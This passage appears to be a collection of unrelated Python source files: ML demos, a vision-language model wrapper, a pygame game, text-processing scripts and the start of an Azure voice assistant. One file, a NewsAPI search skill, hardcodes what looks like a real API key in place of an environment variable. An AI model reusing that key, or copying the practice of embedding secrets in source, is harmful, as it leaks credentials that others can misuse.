}}\r\n    .stSlider > div {{\r\n        background-color: transparent;\r\n    }}\r\n    </style>\r\n    \"\"\"\r\n    st.markdown(page_bg_img, unsafe_allow_html=True)\r\n\r\n# Function to read and encode the image file\r\nimport base64\r\n\r\ndef get_base64_image(image_path):\r\n    with open(image_path, \"rb\") as image_file:\r\n        encoded_string = base64.b64encode(image_file.read()).decode()\r\n    return encoded_string\r\n\r\n# Call the function with the background image\r\nimage_base64 = get_base64_image(\"image.jpg\")  # Path to your image\r\nset_background(image_base64)\r\n\r\n# Streamlit title\r\nst.markdown(\"<h1 class='title'>Gaussian Naive Bayes Classifier - Income Prediction</h1>\", unsafe_allow_html=True)\r\n\r\n# Collect user input\r\nage = st.number_input('Age', min_value=0, max_value=100, value=30)\r\nworkclass = st.selectbox('Workclass', ['Private', 'Self-emp-not-inc', 'Self-emp-inc', 'Federal-gov', 'Local-gov', 'State-gov', 'Without-pay', 'Never-worked'])\r\nfnlwgt = st.number_input('Final Weight', min_value=0, value=200000)\r\neducation = st.selectbox('Education', ['Bachelors', 'HS-grad', '11th', 'Masters', '9th', 'Some-college', 'Assoc-acdm', 'Assoc-voc', '7th-8th', 'Doctorate', 'Prof-school', '5th-6th', '10th', '1st-4th', 'Preschool', '12th'])\r\neducation_num = st.number_input('Education Num', min_value=0, max_value=20, value=13)\r\nmarital_status = st.selectbox('Marital Status', ['Married-civ-spouse', 'Divorced', 'Never-married', 'Separated', 'Widowed', 'Married-spouse-absent', 'Married-AF-spouse'])\r\noccupation = st.selectbox('Occupation', ['Tech-support', 'Craft-repair', 'Other-service', 'Sales', 'Exec-managerial', 'Prof-specialty', 'Handlers-cleaners', 'Machine-op-inspct', 'Adm-clerical', 'Farming-fishing', 'Transport-moving', 'Priv-house-serv', 'Protective-serv', 'Armed-Forces'])\r\nrelationship = st.selectbox('Relationship', ['Wife', 'Own-child', 'Husband', 'Not-in-family', 'Other-relative', 'Unmarried'])\r\nrace = st.selectbox('Race', ['White', 'Black', 'Asian-Pac-Islander', 'Amer-Indian-Eskimo', 'Other'])\r\nsex = st.selectbox('Sex', ['Male', 'Female'])\r\ncapital_gain = st.number_input('Capital Gain', min_value=0, value=0)\r\ncapital_loss = st.number_input('Capital Loss', min_value=0, value=0)\r\nhours_per_week = st.number_input('Hours per Week', min_value=1, max_value=100, value=40)\r\nnative_country = st.selectbox('Native Country', ['United-States', 'Canada', 'Mexico', 'India', 'Germany', 'Philippines', 'Puerto-Rico'])\r\n\r\n# Create input dictionary and DataFrame\r\ninput_data = {\r\n    'age': age,\r\n    'workclass': workclass,\r\n    'fnlwgt': fnlwgt,\r\n    'education': education,\r\n    'education_num': education_num,\r\n    'marital_status': marital_status,\r\n    'occupation': occupation,\r\n    'relationship': relationship,\r\n    'race': race,\r\n    'sex': sex,\r\n    'capital_gain': capital_gain,\r\n    'capital_loss': capital_loss,\r\n    'hours_per_week': hours_per_week,\r\n    'native_country': native_country\r\n}\r\n\r\ninput_df = pd.DataFrame([input_data])\r\n\r\n# Create a button to make the prediction\r\nif st.button('Predict'):\r\n    # Apply encoder and scaler\r\n    input_df_encoded = encoder.transform(input_df)\r\n    input_df_scaled = scaler.transform(input_df_encoded)\r\n\r\n    # Make prediction\r\n    prediction = gnb.predict(input_df_scaled)\r\n    prediction_prob = gnb.predict_proba(input_df_scaled)\r\n\r\n    # Display prediction\r\n    if prediction[0] == '>50K':\r\n        st.success(\"The model predicts that the income is more than 50K.\")\r\n    else:\r\n        st.warning(\"The model predicts that the income is less than or equal to 50K.\")\r\n\r\n    # Display model confidence\r\n    st.write(f\"Model Confidence: {prediction_prob[0][1] * 100:.2f}% for >50K\")\r\n",
    "import sys\nimport os\nimport numpy as np\nimport pandas as pd\nfrom sklearn.impute import KNNImputer\nfrom sklearn.pipeline import Pipeline\nfrom NetworkSecurity.constant.train_pipeline import TRAGET_COLLUMN, DATA_TRANSFORMATION_IMPUTER_PARAMS\nfrom NetworkSecurity.entity.artifact_entity import (\n    DataTransformationArtifact,\n    DataValidationArtifact\n)\nfrom NetworkSecurity.entity.config_entity import DataTransformationConfig\nfrom NetworkSecurity.exception.exception import NetworkSecurityException\nfrom NetworkSecurity.logging.logger import logging\nfrom NetworkSecurity.utils.main_utils.utils import save_numpy_array_data, save_object\n\n\nclass DataTransformation:\n    def __init__(self, data_validation_artifact:DataValidationArtifact,\n                 data_transformation_config: DataTransformationConfig\n                 ):\n        try:\n            self.data_validation_artifact:DataValidationArtifact = data_validation_artifact\n            self.data_transformation_config:DataTransformationConfig = data_transformation_config\n            \n        except Exception as e:\n            raise NetworkSecurityException(e,sys)\n        \n    @staticmethod\n    def read_data(file_path)-> pd.DataFrame:\n        try:\n           return pd.read_csv(file_path)\n            \n        except Exception as e:\n            raise NetworkSecurityException(e,sys)\n        \n    \n    def get_data_transformer_object(cls)->Pipeline:\n            \"\"\"\n            It initialises a KNNImputer object with the parameters specified in the training_pipeline.py file\n            and returns a Pipeline object with the KNNImputer object as the first step.\n\n            Args:\n            cls: DataTransformation\n\n            Returns:\n            A Pipeline object\n            \"\"\"\n            logging.info(\n                \"Entered get_data_trnasformer_object method of Trnasformation class\"\n            )\n            try:\n                imputer:KNNImputer=KNNImputer(**DATA_TRANSFORMATION_IMPUTER_PARAMS)\n                logging.info(\n                        f\"Initialise KNNImputer with {DATA_TRANSFORMATION_IMPUTER_PARAMS}\"\n                    )\n                processor:Pipeline=Pipeline([(\"imputer\",imputer)])\n                \n                return processor\n            except Exception as e:\n                raise NetworkSecurityException(e,sys)\n            \n    \n    def InitateDataTransformation(self)-> DataTransformationArtifact:\n        logging.info(\"Entered data transformation\")\n        try:\n            logging.info(f\"starting data transformation\")\n            train_df = DataTransformation.read_data(self.data_validation_artifact.valid_training_file_path)\n            test_df = DataTransformation.read_data(self.data_validation_artifact.valid_testing_file_path)\n            \n\n            input_feature_train_df = train_df.drop(columns=[TRAGET_COLLUMN], axis=1)\n            target_feature_train_df = train_df[TRAGET_COLLUMN]\n            target_feature_train_df = target_feature_train_df.replace(-1,0)\n            \n            input_feature_test_df = test_df.drop(columns=[TRAGET_COLLUMN], axis=1)\n            target_feature_test_df = test_df[TRAGET_COLLUMN]\n            target_feature_test_df = target_feature_test_df.replace(-1,0)\n            preprocess = self.get_data_transformer_object()\n            preprocess_obj = preprocess.fit(input_feature_train_df)\n            transformed_input_train_feature = preprocess_obj.transform(input_feature_train_df)\n            transformed_input_test_feature = preprocess_obj.transform(input_feature_test_df)\n\n            train_arr = np.c_[transformed_input_train_feature, np.array(input_feature_train_df)]\n            test_arr = np.c_[transformed_input_test_feature, np.array(input_feature_test_df)]\n            \n            #save numpy array data\n            save_numpy_array_data( self.data_transformation_config.transformed_train_file_path, array=train_arr, )\n            save_numpy_array_data( self.data_transformation_config.transformed_test_file_path,array=test_arr,)\n            save_object( self.data_transformation_config.transformed_object_file_path, preprocess_obj,)\n\n            save_object( \"final_model/preprocessor.pkl\", preprocess_obj,)\n\n\n            #preparing artifacts\n\n            data_transformation_artifact=DataTransformationArtifact(\n                transformed_object_file_path=self.data_transformation_config.transformed_object_file_path,\n                transformed_train_file_path=self.data_transformation_config.transformed_train_file_path,\n                transformed_test_file_path=self.data_transformation_config.transformed_test_file_path\n            )\n            return data_transformation_artifact\n        except Exception as e:\n            raise NetworkSecurityException(e,sys)",
    "\nimport transformers\nfrom PIL import Image\nimport requests\nfrom transformers import (AutoProcessor, \n                          AutoModel, \n                          PreTrainedModel, \n                          PretrainedConfig, \n                          AutoTokenizer, \n                          AutoModelForCausalLM, \n                          LlamaForCausalLM)\nfrom transformers.modeling_outputs import CausalLMOutputWithPast\n\nfrom typing import Dict, Optional, Sequence, List\nimport torch.nn as nn\nimport torch\nimport torch.nn.functional as F\n\nclass VLMConfig(PretrainedConfig):\n    model_type = \"vlm_model\"\n    def __init__(\n            self, \n            llm_model_path=\"checkpoints/Qwen2.5-0.5B\", \n            vision_model_path='checkpoints/siglip-so400m-patch14-384', \n            freeze_vision_model=True, \n            freeze_llm=True, \n            image_pad_num=169, \n            **kwargs):\n        self.vision_model_path = vision_model_path\n        self.llm_model_path = llm_model_path\n        self.freeze_vision_model = freeze_vision_model\n        self.freeze_llm = freeze_llm\n        self.image_pad_num = image_pad_num\n        super().__init__(**kwargs)\n\n\nclass VLM(PreTrainedModel):\n    config_class = VLMConfig\n    def __init__(self, config):\n        super().__init__(config)\n        self.config = config\n        self.vision_model = AutoModel.from_pretrained(self.config.vision_model_path)\n        self.processor = AutoProcessor.from_pretrained(self.config.vision_model_path)\n        self.llm_model = AutoModelForCausalLM.from_pretrained(self.config.llm_model_path)\n        self.tokenizer = AutoTokenizer.from_pretrained(self.config.llm_model_path)\n        self.linear1 = nn.Linear(self.vision_model.config.vision_config.hidden_size, self.llm_model.config.hidden_size)\n        self.linear2 = nn.Linear(self.llm_model.config.hidden_size, self.llm_model.config.hidden_size)\n\n        # if self.config.freeze_vision_model:\n        #     for param in self.vision_model.parameters():\n        #         param.requires_grad = False\n        # if self.config.freeze_llm_model:\n        #     for param in self.llm_model.parameters():\n        #             param.requires_grad = False\n\n\n        \n    def forward(\n            self, \n            input_ids, \n            labels, \n            pixel_values, \n            attention_mask=None, \n            inputs_embeds: Optional[torch.FloatTensor] = None,\n            output_attentions: Optional[bool] = None,\n            output_hidden_states: Optional[bool] = None,\n            return_dict: Optional[bool] = None,\n        ):\n        # you can specific the inputs_embeds or by get_input_embeddings from input_ids\n        text_embeds = self.llm_model.get_input_embeddings()(input_ids)\n        \n        image_embeds = self.vision_model.vision_model(pixel_values).last_hidden_state \n        # image_results = self.vision_model.vision_model(pixel_values)\n        b, s, d = image_embeds.shape\n\n        # \u5bf9image_embeds reshape (b, s, d) -> (b, h, w, d)\n        # \u53cc\u7ebf\u6027\u63d2\u503c image_embeds \u5f97\u5230(b, h // 2, w // 2, d)\n        h, w = int(torch.sqrt(torch.tensor(s))), int(torch.sqrt(torch.tensor(s)))\n        image_embeds = image_embeds.view(b, h, w, d)\n        image_embeds = F.interpolate(image_embeds.permute(0, 3, 1, 2), size=(h // 2, w // 2), mode='bilinear').permute(0, 2, 3, 1)\n        image_embeds = image_embeds.view(b, -1, d)\n\n        # image_embeds = image_embeds.view(b, -1, d*4)  # (b, 196, d) --> (b, 49, d*4) \u538b\u7f29\u56fe\u7247tokens\n        image_features = self.linear2(F.silu(self.linear1(image_embeds)))\n        \n        text_embeds = text_embeds.to(image_features.dtype)\n        \n        inputs_embeds = self.merge_input_ids_with_image_features(image_features, text_embeds, input_ids)\n        outputs = self.llm_model(inputs_embeds=inputs_embeds, attention_mask=attention_mask)\n        logits = outputs[0]\n        loss = None\n        if labels is not None:\n            loss_fct = nn.CrossEntropyLoss(ignore_index=self.tokenizer.pad_token_id)\n            loss = loss_fct(\n                logits.view(-1, logits.size(-1)), labels.view(-1).to(logits.device)\n            )\n        return CausalLMOutputWithPast(loss=loss, logits=logits)\n        \n    def merge_input_ids_with_image_features(self, image_features, inputs_embeds, input_ids):\n        \n        num_images, num_image_patches, embed_dim = image_features.shape\n        batch_indices, image_indices = torch.where(input_ids == self.tokenizer('<|image_pad|>')['input_ids'][0])\n        \n        inputs_embeds[batch_indices, image_indices] = image_features.view(-1, embed_dim)\n        # inputs_embeds[batch_indices, image_indices] = image_features\n        \n        return inputs_embeds",
    "# Ainara - Open Source AI Assistant Framework\n# Copyright (C) 2025 Rub\u00e9n G\u00f3mez http://www.khromalabs.org\n\n# This program is free software; you can redistribute it and/or\n# modify it under the terms of the GNU General Public License\n# as published by the Free Software Foundation; either version 2\n# of the License, or (at your option) any later version.\n\n# This program is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n\n# You should have received a copy of the GNU General Public License\n# along with this program; if not, see\n# <https://www.gnu.org/licenses/>.\n\nimport logging\n\nfrom newsapi import NewsApiClient\n\nfrom ainara.framework.skill import Skill\n\nSUPPORTED_LANGUAGES = {\n    \"ar\",\n    \"de\",\n    \"en\",\n    \"es\",\n    \"fr\",\n    \"he\",\n    \"it\",\n    \"nl\",\n    \"no\",\n    \"pt\",\n    \"ru\",\n    \"sv\",\n    \"zh\",\n}\n\n\nclass NewsSearch(Skill):\n    \"\"\"Search news articles using NewsAPI\"\"\"\n\n    def __init__(self):\n        super().__init__()\n        # logging.getLogger().setLevel(logging.DEBUG)\n        # api_key = os.getenv('NEWSAPI_KEY')\n        api_key = \"f7a41568e4cd4a2ab5e8aefed810fa6b\"\n        if not api_key:\n            raise ValueError(\"NEWSAPI_KEY environment variable is required\")\n        self.newsapi = NewsApiClient(api_key=api_key)\n\n    async def run(\n        self,\n        query: str,\n        language: str = \"en\",\n        sort_by: str = \"popularity\",\n        from_date: str = None,\n        to_date: str = None,\n    ):\n        \"\"\"Search news articles using NewsAPI\"\"\"\n        logging.debug(\n            f\"NewsSearch.run() called with parameters: query='{query}',\"\n            f\" language='{language}' ({type(language)}), sort_by='{sort_by}',\"\n            f\" from_date='{from_date}', to_date='{to_date}',\"\n        )\n\n        # Validate query\n        if not isinstance(query, str):\n            return {\n                \"status\": \"error\",\n                \"message\": f\"Query must be a string, got {type(query)}\",\n            }\n\n        if not query or query.strip() == \"\" or query == \"query\":\n            return {\n                \"status\": \"error\",\n                \"message\": \"Query parameter cannot be empty or invalid\",\n            }\n\n        \"\"\"\n        Search for news articles matching the query\n\n        Args:\n            query: Search query string\n            language: Language code (default: 'en'). Must be one of:\n            ar, de, en, es, fr, he, it, nl, no, pt, ru, sv, zh\n            sort_by: Sort order ('relevancy', 'popularity', 'publishedAt')\n\n        Returns:\n            Dict containing search results\n        \"\"\"\n        # Validate language code\n        if not isinstance(language, str):\n            return {\n                \"status\": \"error\",\n                \"message\": f\"Language must be a string, got {type(language)}\",\n            }\n\n        # Check for unprocessed template variables\n        if \"{{\" in language or \"}}\" in language:\n            return {\n                \"status\": \"error\",\n                \"message\": (\n                    \"Invalid language parameter: contains template markers\"\n                ),\n            }\n\n        language = language.lower().strip()\n        logging.debug(\n            f\"After cleaning, language code: '{language}', type:\"\n            f\" {type(language)}\"\n        )\n        logging.debug(f\"Supported languages: {sorted(SUPPORTED_LANGUAGES)}\")\n        if language not in SUPPORTED_LANGUAGES:\n            return {\n                \"status\": \"error\",\n                \"message\": (\n                    \"Invalid language code. Must be one of:\"\n                    f\" {', '.join(sorted(SUPPORTED_LANGUAGES))}\"\n                ),\n            }\n        try:\n            logging.info(\n                f\"Searching news with query='{query}' language='{language}'\"\n                f\" sort_by='{sort_by}'\"\n            )\n            # Build parameters dict\n            params = {\n                \"qintitle\": query,\n                \"language\": language,\n                \"sort_by\": sort_by,\n            }\n\n            # Add optional parameters if provided\n            if from_date:\n                params[\"from_param\"] = from_date\n            if to_date:\n                params[\"to\"] = to_date\n\n            logging.debug(f\"Calling NewsAPI with parameters: {params}\")\n            response = self.newsapi.get_everything(**params)\n            logging.info(f\"Got {len(response['articles'])} results\")\n\n            # Format the results\n            articles = []\n            for article in response[\"articles\"][:5]:  # Limit to top 5 results\n                articles.append(\n                    {\n                        \"title\": article[\"title\"],\n                        \"description\": article[\"description\"],\n                        \"url\": article[\"url\"],\n                        \"source\": article[\"source\"][\"name\"],\n                        \"published\": article[\"publishe",
    "import pygame\r\nimport sys\r\nimport random\r\nimport time\r\n\r\n\r\n# \u521d\u59cb\u5316Pygame\r\npygame.init()\r\nscreen_width = 1400\r\nscreen_height = 750\r\nscreen = pygame.display.set_mode((screen_width, screen_height))\r\npygame.display.set_caption('\u5929\u4f7f\u4e4b\u8def')\r\n\r\n\r\n# \u5206\u6570\u4f4d\u7f6e\u548c\u5b57\u4f53\u8bbe\u7f6e\r\nf = pygame.font.Font('C:\\\\Windows\\\\Fonts\\\\simfang.ttf', 35)\r\nscore = 0\r\nscore_real = 0\r\ntext_background_color = (200, 229, 179)\r\ntext_foreground_color = (41, 39, 39)\r\ntextRect = pygame.Rect(580, 10, 150, 40)\r\n\r\n\r\n# \u751f\u547d\u503c\u8bbe\u7f6e\r\nlives = 3   # \u9ed8\u8ba4\u4e09\u6761\u547d\r\nlife_text = f.render(f\"\u751f\u547d\u503c\uff1a{lives}\", True, text_foreground_color, text_background_color)\r\nlife_text_rect = pygame.Rect(10, 10, 150, 40)\r\n\r\n\r\n# \u8b66\u544a\u4fe1\u606f\u8bbe\u7f6e\r\nwarning_message = ''\r\nwarning_start_time = 0\r\nwarning_duration = 1000  # \u8b66\u544a\u4fe1\u606f\u663e\u793a\u65f6\u95f4\r\n\r\n\r\n# \u80cc\u666f\u56fe\u8bbe\u7f6e\r\nbackground_image = pygame.image.load('back_picture1.jpg')\r\nbackground_rect = background_image.get_rect()\r\nbackground_speed = 6  # \u521d\u59cb\u6eda\u52a8\u901f\u5ea6\r\nbackground_x_pos = 0\r\nrunning = True\r\nclock = pygame.time.Clock()\r\nframe_counter = 0\r\nspeed_increase_interval = 240  # \u6bcf240\u5e27\u589e\u52a0\u4e00\u6b21\u901f\u5ea6\r\n\r\n\r\n# \u5267\u60c5\u6545\u4e8b\r\nstory_lines = [\r\n    '\u90a3\u4e00\u5929\u6211\u91cd\u751f\u4e86....',\r\n    '\u6211\u91cd\u751f\u5728\u95ea\u52a8\u7ed3\u7b97\u7684\u524d\u4e00\u4e2a\u6708\u3002',\r\n    '\u8fd9\u4e00\u6b21\u6211\u53d1\u8a93\u8981\u593a\u56de\u6211\u7684\u6821\u56ed\u8dd1\u3002',\r\n    '\u5e76\u5728\u5929\u4f7f\u4e4b\u8def\u4e0a\u8eb2\u907f\u5c0f\u767d\u9e6d\u51b0\u6dc7\u6dcb\u3002',\r\n    '\u8bf7\u9009\u62e9\u4f60\u7684\u89d2\u8272\uff01'\r\n]\r\n\r\n# \u9009\u62e9\u4eba\u7269\r\ncharacter_images = [\r\n    pygame.image.load('character1.png').convert_alpha(),\r\n    pygame.image.load('character2.png').convert_alpha(),\r\n]\r\ntarget_size = (250, 400) \r\nfor i in range(len(character_images)):\r\n    character_images[i] = pygame.transform.scale(character_images[i], target_size)\r\nfor img in character_images:\r\n    img.set_colorkey((255, 255, 255))\r\ncharacter_positions = [(300, 300), (850, 300)]  #\u89d2\u8272\u4f4d\u7f6e\r\nselected_character_index = None  #\u9009\u62e9\u7684\u89d2\u8272\u7d22\u5f15\r\n\r\n# \u52a0\u8f7d\u4eba\u7269\u56fe\u7247\r\ncharacters = [[\r\n    pygame.image.load('role11.png').convert_alpha(),\r\n    pygame.image.load('role13.png').convert_alpha(),\r\n    pygame.image.load('role12.png').convert_alpha()],#\u5973\u751f\r\n    [\r\n        pygame.image.load('role21.png').convert_alpha(),\r\n        pygame.image.load('role23.png').convert_alpha(),\r\n        pygame.image.load('role22.png').convert_alpha()]#\u7537\u751f\r\n    \r\n]\r\n\r\n# \u6807\u8bb0\u662f\u5426\u4e3a\u4e3e\u4f1e\u4eba\u7269\r\nis_showing_umbrella_character = False\r\n# \u52a0\u8f7d\u4e3e\u4f1e\u4eba\u7269\u56fe\u7247\r\numbrella_characters = [[\r\n    pygame.image.load('role1_1.png').convert_alpha(),\r\n    pygame.image.load('role1_3.png').convert_alpha(),\r\n    pygame.image.load('role1_2.png').convert_alpha()],\r\n    [pygame.image.load('role2_1.png').convert_alpha(),\r\n    pygame.image.load('role2_3.png').convert_alpha(),\r\n    pygame.image.load('role2_2.png').convert_alpha()\r\n        ]\r\n]\r\n\r\n\r\n# \u52a0\u8f7d\u5c0f\u767d\u9e6d\u56fe\u7247\r\nbird_image = pygame.image.load('bird.png').convert_alpha()\r\nbird_rect = bird_image.get_rect()\r\nbird_rect.topright = (1350, 50)  \r\n\r\n# \u52a0\u8f7d\u5e76\u7f29\u653e\u62a4\u76fe\u788e\u7247\u56fe\u7247\r\nshield_piece_image = pygame.image.load('shield_piece.png').convert_alpha()\r\ndesired_shield_piece_size = (180,180)  # \u8bbe\u7f6e\u62a4\u76fe\u788e\u7247\u5927\u5c0f\r\nshield_piece_image = pygame.transform.scale(shield_piece_image, desired_shield_piece_size)\r\nshield_pieces = []  # \u5b58\u50a8\u62a4\u76fe\u788e\u7247\u7684\u4f4d\u7f6e\r\nnext_shield_piece_time = time.time() + random.uniform(10, 20)  # \u4e0b\u4e00\u4e2a\u62a4\u76fe\u788e\u7247\u51fa\u73b0\u7684\u65f6\u95f4\r\nshield_count = 0  # \u73a9\u5bb6\u6536\u96c6\u7684\u62a4\u76fe\u788e\u7247\u6570\u91cf\r\n\r\n# \u8bb0\u5f55\u5c0f\u767d\u9e6d\u9759\u6b62\r\nbird_still = False\r\nbird_still_time = 0\r\n\r\n# \u52a0\u8f7d\u969c\u788d\u7269\u56fe\u7247\r\nbarrier_image = pygame.image.load('barrier1.png').convert_alpha()\r\nbarrier2_image = pygame.image.load('barrier2.png').convert_alpha()\r\n\r\n# \u52a0\u8f7d\u80cc\u666f\u97f3\u4e50\r\npygame.mixer.music.load('BGM.mp3')\r\npygame.mixer.music.play(loops=-1)  # \u5faa\u73af\u64ad\u653e\r\npygame.mixer.music.set_volume(0.5)\r\n\r\n# \u8df3\u8dc3\u53c2\u6570\r\njump_params = {\r\n    'normal': {'jump_height': 200, 'velocity': -15, 'gravity': 0.55},\r\n    'umbrella': {'jump_height': 250, 'velocity': -13.5, 'gravity': 0.4}\r\n}\r\n\r\n# \u8df3\u8dc3\u5b9e\u73b0\r\njumping = False\r\njumping_started = False\r\numbrella_jumping = False\r\nis_umbrella_used_in_jump = False\r\n\r\n# \u969c\u788d\u7269\u51fa\u73b0\u65f6\u95f4\r\nlast_barrier_time = time.time()\r\nnext_barrier_time = last_barrier_time + random.uniform(1, 3)  # \u4e0b\u4e00\u4e2a\u969c\u788d\u7269\u751f\u6210\u7684\u65f6\u95f4\r\nbarriers = []\r\n\r\n# \u9f20\u6807\u5de6\u952e\r\nmouse_click_time = None\r\nshow_umbrella_duration = 1000 \r\n\r\n# \u6e38\u620f\u7ed3\u675f\u6807\u5fd7\r\ngame_over = False\r\n\r\ndef begin_screen():\r\n    title_font = pygame.font.Font('C:\\\\Windows\\\\Fonts\\\\simfang.ttf', 60)\r\n    button_font = pygame.font.Font('C:\\\\Windows\\\\Fonts\\\\simfang.ttf', 40)\r\n    title_text = title_font.render('\u5929\u4f7f\u4e4b\u8def', True, text_foreground_color, text_background_color)\r\n    button_text = button_font.render('\u5f00\u59cb\u6e38\u620f', True, text_foreground_color, text_background_color)\r\n    title_rect = title_text.get_rect(center=(screen_width // 2, screen_height // 4))\r\n    button_rect = button_text.get_rect(center=(screen_width // 2, screen_height * 3 // 4))\r\n\r\n    running = True\r\n    while running:\r\n        for event in pygame.event.get():\r\n            if event.type == pygame.QUIT:\r\n                running = False\r\n                pygame.quit()\r\n                sys.exit()\r\n            elif event.type == pygame.MOUSEBUTTONDOWN:\r\n                mouse_pos = pygame.mouse.get_pos()\r\n                if button_rect.collidepoint(mouse_pos):\r\n                    running = False  # \u70b9\u51fb\u6309\u94ae\u540e\u9000\u51fa\u5f00\u59cb\u754c\u9762\r\n\r\n        # \u7ed8\u5236\u80cc\u666f\r\n        screen.blit(background_image, (0, 0))\r\n\r\n        # \u7ed8\u5236\u6807\u9898\u548c\u6309\u94ae\r\n        screen.blit(title_text, title_rect)\r\n        screen.blit(button_text, button_rect)\r\n\r\n        pygame.display",
    "\"\"\"\nCommand-line entry for autodiff.\n\nThe ada command-line tool reads a file containing APL dfns,\ncomputes their derivatives, and writes the results to a new file.\n\nUsage:\n    ada <apl> <aplparse>\n\nArgs:\n    apl: Path to APL file of dfns to differentiate.\n    aplparse: Path to aplparse executable.\n\"\"\"\n\n\ndef main():\n    import argparse\n    import re\n\n    from .autodiff import autodiff\n\n    parser = argparse.ArgumentParser(description='Differentiates a file of APL dfns and \\\n                                                  writes the derivatives to a new file.')\n    parser.add_argument('apl',\n                        help='Path to APL file of dfns to differentiate.',\n                        type=str)\n    parser.add_argument('aplparse',\n                        help='Path to aplparse executable.',\n                        type=str)\n    args = parser.parse_args()\n\n    res = []\n    with open(args.apl, 'r') as f:\n        # The regex pattern extracts dfns.\n        for apl in re.findall(r'\\b\\w+\u2190\\{[^{}]*\\}', f.read()):\n            print(f'Differentiating {apl.split(\"\u2190\")[0]}...')\n            res.append(autodiff(apl, args.aplparse))\n            print(f'Derivative successfully calculated.')\n\n    # A 'd' prefix is prepended to the original filename.\n    with open(re.sub(r'([^/]+)$', r'd\\1', args.apl), 'w+') as f:\n        f.write('\\n\\n'.join(res))\n\n\nif __name__ == '__main__':\n    main()\n",
    "import json\nimport sys\nimport re\nimport os\n\n## \u58f0\u5f8b\u542f\u8499\ndef process_text(input_text):\n    # Split text into lines and remove empty lines\n    lines = [line.strip() for line in input_text.split('\\n') if line.strip()]\n    print(f'# of lines detected: {len(lines)}')\n    results = []\n    \n    for line in lines:\n        # Skip lines that are just punctuation or whitespace\n        if re.match(r'^[\u3000\\s\\u3000,.\u3002\uff0c\uff1b;]+$', line):\n            continue\n            \n        sentences = line.split('\u3002')\n        # remove empty strings\n        sentences = [sentence for sentence in sentences if sentence]\n        assert len(sentences) == 6, f\"Error: Expected 6 sentences per line, but got {len(sentences)} sentences\uff1a{line}\"\n        \n        for i in range(len(sentences)):\n            if i== 0 or i == 1:\n                pairs = sentences[i].split('\uff0c')\n                for pair in pairs:\n                    couplets = pair.split('\u5bf9')\n                    results.append({'0': couplets[0], '1': couplets[1]})\n            if i ==2:\n                pairs = sentences[i].split('\uff0c')\n                results.append({'0': pairs[0], '1': pairs[1]})\n                couplets = pairs[2].split('\u5bf9')\n                results.append({'0': couplets[0], '1': couplets[1]})\n            if i ==3 or i == 4:\n                couplets = sentences[i].split('\uff0c')\n                results.append({'0': couplets[0], '1': couplets[1]})\n            if i== 5:\n                couplets = sentences[-1].split('\uff1b')\n                results.append({'0': couplets[0], '1': couplets[1]})\n\n    return results\n\ndef main():\n    base_foldername = './\u539f\u6587'\n    # loop through the files in the folder\n    files = os.listdir(base_foldername)\n    assert len(files) == 30, f\"Error: Expected 30 files, but got {len(files)} files\"\n\n    for filename in files:\n        # Get the base filename (without extension)\n        base_filename = filename.split('.')[0]\n\n        input_filename = f\"{base_foldername}/{base_filename}.txt\"\n        output_filename = f\"dataset/{base_filename}.json\"\n        try:\n            # Check if input file exists\n            if not os.path.exists(input_filename):\n                print(f\"Error: Input file {input_filename} not found\")\n                sys.exit(1)\n            print(f\"Processing {input_filename}...\")\n\n            # Read input from text file\n            with open(input_filename, 'r', encoding='utf-8') as f:\n                input_text = f.read()\n\n            # Process the text\n            result = process_text(input_text)\n\n            # Write to JSON file\n            with open(output_filename, 'w', encoding='utf-8') as f:\n                json.dump(result, f, ensure_ascii=False, indent=4)\n\n        except Exception as e:\n            print(f\"Error: {str(e)}\")\n            sys.exit(1)\n\n    print(f\"Successfully processed {base_foldername}.\")\n\nif __name__ == \"__main__\":\n    main()",
    "# Heart Disease Data Processing Script\n\n#Import necessary libraries\nimport pandas as pd\nfrom sklearn.preprocessing import MinMaxScaler\n\n# Step 1: Load Dataset\nfile_path = 'Heart.csv'\ndf = pd.read_csv(file_path)\n\n# Step 2: Inspect Data \nprint('Data Info:')\nprint(df.info())\nprint('\\nData Stats:')\nprint(df.describe())\nprint('\\nFirst 5 rows:')\nprint(df.head())\n\n# Step 3: Save Data in Various Formats\ndf.to_excel('dataset.xlsx', index=False)\ndf.to_json('dataset.json', orient='records', indent=2)\nfrom sqlalchemy import create_engine\nengine = create_engine(\"sqlite:///:memory:\")\ndf.to_sql('dataset', con=engine, index=False, if_exists='replace')\n\n# Step 4: Reload Data to Verify \ndf_excel = pd.read_excel('dataset.xlsx')\ndf_json = pd.read_json('dataset.json')\ndf_sql = pd.read_sql('dataset', con=engine)\n\n# Step 5: Clean and Prepare Data\n# Handle Missing Values\ndf.fillna(method='ffill', inplace=True)\n# Remove Duplicates\ndf.drop_duplicates(inplace=True)\n# Normalize Numerical Data \nscaler = MinMaxScaler()\nnumerical_cols = df.select_dtypes(include=['number']).columns\ndf[numerical_cols] = scaler.fit_transform(df[numerical_cols])\n# Encode Categorical Data\ndf = pd.get_dummies(df, drop_first=True)\n# Final Dataset\nprint('Cleaned Data:')\nprint(df.head())\n# Save the cleaned dataset\ndf.to_csv('cleaned_dataset.csv', index=False)\n",
    "import os  \nfrom dotenv import load_dotenv  \nimport io  \nimport azure.cognitiveservices.speech as speechsdk  \nfrom openai import OpenAI\nimport time  \nimport datetime  \nimport threading  \nimport json, ast  \n\nimport requests  \nfrom io import BytesIO  \nimport tempfile  \nimport numpy as np  \n#import pyaudio  \n  \nload_dotenv(\"voice1.env\")  \nclient = OpenAI(api_key=os.environ[\"api_key\"], base_url=os.environ[\"base_url\"])\nAzure_speech_key = os.environ[\"Azure_speech_key\"]  \nAzure_speech_region = os.environ[\"Azure_speech_region\"]  \nAzure_speech_speaker = os.environ[\"Azure_speech_speaker\"]  \nWakeupWord = os.environ[\"WakeupWord\"]  \nWakeupModelFile = os.environ[\"WakeupModelFile\"]  \n\nmessages = []  \n\n# Set up Azure Speech-to-Text and Text-to-Speech credentials  \nspeech_key = Azure_speech_key  \nservice_region = Azure_speech_region  \nspeech_config = speechsdk.SpeechConfig(subscription=speech_key, region=service_region)  \n# Set up Azure Text-to-Speech language  \nspeech_config.speech_synthesis_language = \"zh-CN\"  \n# Set up Azure Speech-to-Text language recognition  \nspeech_config.speech_recognition_language = \"zh-CN\"  \nlang = \"zh-CN\"  \n# Set up the voice configuration  \nspeech_config.speech_synthesis_voice_name = Azure_speech_speaker  \nspeech_synthesizer = speechsdk.SpeechSynthesizer(speech_config=speech_config)  \nconnection = 